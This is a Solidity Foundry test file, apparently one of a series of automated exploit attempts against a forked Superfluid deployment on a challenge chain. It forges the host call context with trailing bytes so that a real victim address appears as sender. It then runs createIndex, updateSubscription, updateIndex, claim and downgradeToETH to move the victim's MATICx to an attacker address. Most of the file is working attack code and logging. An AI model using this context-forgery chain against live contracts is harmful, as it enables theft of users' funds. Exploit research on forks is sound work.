// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {ContextUtils} from "reference/ContextUtils.sol";

interface ISuperAgreement {}

interface ISuperfluidHost {
    function callAgreement(
        ISuperAgreement agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory returnedData);
}

interface IInstantDistributionAgreementV1 is ISuperAgreement {
    function createIndex(address token, uint32 indexId, bytes calldata ctx) external returns (bytes memory newCtx);

    function updateSubscription(
        address token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateIndex(
        address token,
        uint32 indexId,
        uint128 indexValue,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function claim(
        address token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function getIndex(address token, address publisher, uint32 indexId)
        external
        view
        returns (bool exist, uint128 indexValue, uint128 totalUnitsApproved, uint128 totalUnitsPending);

    function getSubscription(address token, address publisher, uint32 indexId, address subscriber)
        external
        view
        returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);
}

interface IMATICxLike {
    function balanceOf(address account) external view returns (uint256);

    function downgradeToETH(uint256 wad) external;
}

/// @title Attempt23
/// @notice Hypothesis A probe from `analysis_v2.md`: if the fork IDA also
///         skips Patch-1 ctx validation on `createIndex()`, then the old v1
///         trailing-bytes publisher-forgery chain should reopen on ch5.
///
///         This PoC does exactly the requested sequence:
///         1. Build a forged ctx with `msgSender = RANDOM_VICTIM`.
///         2. Call `HOST.callAgreement(IDA, abi.encodePacked(createIndex(...,
///            fakeCtx), abi.encode(new bytes(0))), "")`.
///         3. Check whether `getIndex(MATICx, RANDOM_VICTIM, 42)` now exists.
///         4. Only if step 3 succeeds, continue the full v1 replay:
///            `createIndex -> updateSubscription -> updateIndex -> claim ->
///            downgradeToETH`.
///
///         The chosen victim is a live EOA on the fork with:
///         - positive MATICx balance
///         - no pre-existing `indexId = 42`
/// @dev Earlier attempts already closed the registered-SuperApp variant. This
///      file tests the exact Brain-requested "random victim" EOA variant and
///      keeps the full chain behind a successful forged `createIndex()`.
contract Attempt23 is Test {
    uint256 internal constant FORK_BLOCK = 27_039_967;

    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address internal constant RANDOM_VICTIM = 0x1c81F6A5dbD715BE1a66a38F7Ed3Bbcd4098EDd4;

    address internal constant HOST_ADDR = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address internal constant IDA_ADDR = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address internal constant MATICX_ADDR = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;

    uint32 internal constant INDEX_ID = 42;
    uint128 internal constant ATTACKER_UNITS = 1;
    uint128 internal constant FORGED_INDEX_VALUE = 1e15;

    ISuperfluidHost internal constant HOST = ISuperfluidHost(HOST_ADDR);
    IInstantDistributionAgreementV1 internal constant IDA = IInstantDistributionAgreementV1(IDA_ADDR);
    IMATICxLike internal constant MATICX = IMATICxLike(MATICX_ADDR);

    function setUp() public {
        vm.createSelectFork("ch5", FORK_BLOCK);

        vm.label(ATTACKER, "Attacker");
        vm.label(RANDOM_VICTIM, "RandomVictim");
        vm.label(HOST_ADDR, "SuperfluidHost");
        vm.label(IDA_ADDR, "IDA");
        vm.label(MATICX_ADDR, "MATICx");
    }

    function test_hypothesisA_forged_createIndex_then_v1_chain_if_open() public {
        _logPreflight();

        (bool victimIndexBefore, uint128 victimIndexValueBefore,,) = IDA.getIndex(MATICX_ADDR, RANDOM_VICTIM, INDEX_ID);
        (bool attackerIndexBefore,,,) = IDA.getIndex(MATICX_ADDR, ATTACKER, INDEX_ID);

        console.log("[baseline] victim index exists:", victimIndexBefore);
        console.log("[baseline] victim index value:", uint256(victimIndexValueBefore));
        console.log("[baseline] attacker index exists:", attackerIndexBefore);

        assertFalse(victimIndexBefore, "chosen victim already has index 42; probe would be ambiguous");

        bytes memory fakeCreateCtx = _buildContext(RANDOM_VICTIM, IDA.createIndex.selector);
        bytes memory forgedCreateCall = abi.encodeCall(IDA.createIndex, (MATICX_ADDR, INDEX_ID, fakeCreateCtx));

        vm.prank(ATTACKER);
        (bool createOk, bytes memory createRet) = _callAgreementWithTrailingBytes(forgedCreateCall);
        _logCallResult("createIndex(host trailing forged victim)", createOk, createRet);

        (bool victimIndexAfter, uint128 victimIndexValueAfter, uint128 victimApprovedAfter, uint128 victimPendingAfter) =
            IDA.getIndex(MATICX_ADDR, RANDOM_VICTIM, INDEX_ID);
        (bool attackerIndexAfter,,,) = IDA.getIndex(MATICX_ADDR, ATTACKER, INDEX_ID);

        console.log("[create result] victim index exists:", victimIndexAfter);
        console.log("[create result] victim index value:", uint256(victimIndexValueAfter));
        console.log("[create result] victim totalUnitsApproved:", uint256(victimApprovedAfter));
        console.log("[create result] victim totalUnitsPending:", uint256(victimPendingAfter));
        console.log("[create result] attacker index exists:", attackerIndexAfter);

        if (!createOk || !victimIndexAfter) {
            console.log("[branch] forged createIndex did not open; skipping full v1 replay");
            return;
        }

        _runFullChainReplay();
    }

    function _runFullChainReplay() internal {
        console.log("[branch] forged victim-owned index exists; continuing full v1 replay");

        bytes memory fakeUpdateSubscriptionCtx = _buildContext(RANDOM_VICTIM, IDA.updateSubscription.selector);
        bytes memory forgedUpdateSubscriptionCall = abi.encodeCall(
            IDA.updateSubscription, (MATICX_ADDR, INDEX_ID, ATTACKER, ATTACKER_UNITS, fakeUpdateSubscriptionCtx)
        );

        vm.prank(ATTACKER);
        (bool updateSubscriptionOk, bytes memory updateSubscriptionRet) =
            _callAgreementWithTrailingBytes(forgedUpdateSubscriptionCall);
        _logCallResult("updateSubscription(host trailing forged victim)", updateSubscriptionOk, updateSubscriptionRet);

        (bool attackerSubExists, bool attackerSubApproved, uint128 attackerUnits, uint256 attackerPendingBeforeUpdate) =
            IDA.getSubscription(MATICX_ADDR, RANDOM_VICTIM, INDEX_ID, ATTACKER);

        console.log("[subscription] exists:", attackerSubExists);
        console.log("[subscription] approved:", attackerSubApproved);
        console.log("[subscription] units:", uint256(attackerUnits));
        console.log("[subscription] pending before updateIndex:", attackerPendingBeforeUpdate);

        if (!updateSubscriptionOk || !attackerSubExists || attackerUnits == 0) {
            console.log("[branch] forged updateSubscription did not open; stopping after createIndex");
            return;
        }

        bytes memory fakeUpdateIndexCtx = _buildContext(RANDOM_VICTIM, IDA.updateIndex.selector);
        bytes memory forgedUpdateIndexCall =
            abi.encodeCall(IDA.updateIndex, (MATICX_ADDR, INDEX_ID, FORGED_INDEX_VALUE, fakeUpdateIndexCtx));

        vm.prank(ATTACKER);
        (bool updateIndexOk, bytes memory updateIndexRet) = _callAgreementWithTrailingBytes(forgedUpdateIndexCall);
        _logCallResult("updateIndex(host trailing forged victim)", updateIndexOk, updateIndexRet);

        (bool indexExistsAfterUpdate, uint128 indexValueAfterUpdate,,) = IDA.getIndex(MATICX_ADDR, RANDOM_VICTIM, INDEX_ID);
        (, , uint128 attackerUnitsAfterUpdate, uint256 attackerPendingAfterUpdate) =
            IDA.getSubscription(MATICX_ADDR, RANDOM_VICTIM, INDEX_ID, ATTACKER);

        console.log("[updateIndex] victim index exists:", indexExistsAfterUpdate);
        console.log("[updateIndex] victim index value:", uint256(indexValueAfterUpdate));
        console.log("[updateIndex] attacker units:", uint256(attackerUnitsAfterUpdate));
        console.log("[updateIndex] attacker pending:", attackerPendingAfterUpdate);

        if (!updateIndexOk || attackerPendingAfterUpdate <= attackerPendingBeforeUpdate) {
            console.log("[branch] forged updateIndex did not create attacker pending distribution");
            return;
        }

        uint256 attackerTokenBeforeClaim = MATICX.balanceOf(ATTACKER);
        uint256 attackerNativeBefore = ATTACKER.balance;

        console.log("[claim] attacker MATICx before:", attackerTokenBeforeClaim);
        console.log("[claim] attacker native before:", attackerNativeBefore);

        vm.prank(ATTACKER);
        (bool claimOk, bytes memory claimRet) = address(HOST).call(
            abi.encodeCall(
                HOST.callAgreement,
                (IDA, abi.encodeCall(IDA.claim, (MATICX_ADDR, RANDOM_VICTIM, INDEX_ID, ATTACKER, new bytes(0))), new bytes(0))
            )
        );
        _logCallResult("claim(plain host)", claimOk, claimRet);

        uint256 attackerTokenAfterClaim = MATICX.balanceOf(ATTACKER);
        console.log("[claim] attacker MATICx after:", attackerTokenAfterClaim);

        if (!claimOk || attackerTokenAfterClaim <= attackerTokenBeforeClaim) {
            console.log("[branch] claim did not materialize attacker balance");
            return;
        }

        uint256 claimedAmount = attackerTokenAfterClaim - attackerTokenBeforeClaim;
        console.log("[downgrade] claimed MATICx:", claimedAmount);

        vm.prank(ATTACKER);
        MATICX.downgradeToETH(claimedAmount);

        uint256 attackerTokenAfterDowngrade = MATICX.balanceOf(ATTACKER);
        uint256 attackerNativeAfter = ATTACKER.balance;

        console.log("[downgrade] attacker MATICx after:", attackerTokenAfterDowngrade);
        console.log("[downgrade] attacker native after:", attackerNativeAfter);
        console.log("[downgrade] native delta:", attackerNativeAfter - attackerNativeBefore);
    }

    function _buildContext(address forgedMsgSender, bytes4 selector) internal view returns (bytes memory) {
        ContextUtils.Context memory context =
            ContextUtils.buildContext(forgedMsgSender, selector, abi.encodePacked("attempt23:", selector));
        return ContextUtils.encodeContext(context);
    }

    function _callAgreementWithTrailingBytes(bytes memory inner) internal returns (bool ok, bytes memory ret) {
        bytes memory outer = abi.encodePacked(inner, abi.encode(new bytes(0)));
        return address(HOST).call(abi.encodeCall(HOST.callAgreement, (IDA, outer, new bytes(0))));
    }

    function _logPreflight() internal view {
        console.log("[preflight] chain id:", block.chainid);
        console.log("[preflight] fork block:", block.number);
        console.log("[preflight] attacker native:", ATTACKER.balance);
        console.log("[preflight] attacker MATICx:", MATICX.balanceOf(ATTACKER));
        console.log("[preflight] victim native:", RANDOM_VICTIM.balance);
        console.log("[preflight] victim MATICx:", MATICX.balanceOf(RANDOM_VICTIM));
        console.log("[preflight] victim code length:", RANDOM_VICTIM.code.length);
    }

    function _logCallResult(string memory label, bool ok, bytes memory wrappedRet) internal pure {
        console.log(label);
        console.log("  ok:", ok);

        if (!ok) {
            console.log("  revert:", _decodeRevert(wrappedRet));
            return;
        }

        bytes memory returnedData = _decodeHostReturn(wrappedRet);
        console.log("  host return bytes:", wrappedRet.length);
        console.log("  agreement return bytes:", returnedData.length);

        if (returnedData.length == 0) {
            return;
        }

        ContextUtils.Context memory decoded = ContextUtils.decodeContext(returnedData);
        console.log("  returned msgSender:", decoded.msgSender);
        console.log("  returned appAddress:", decoded.appAddress);
        console.log("  returned callType:", uint256(decoded.callType));
        console.log("  returned appLevel:", uint256(decoded.appCallbackLevel));
        console.log("  returned selector:");
        console.logBytes32(bytes32(decoded.agreementSelector));
    }

    function _decodeHostReturn(bytes memory wrappedRet) internal pure returns (bytes memory returnedData) {
        if (wrappedRet.length == 0) {
            return new bytes(0);
        }

        returnedData = abi.decode(wrappedRet, (bytes));
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            if (revertData.length == 0) return "silent revert";
            return string(revertData);
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            assembly {
                revertData := add(revertData, 4)
            }
            return abi.decode(revertData, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        return "custom/unknown";
    }
}
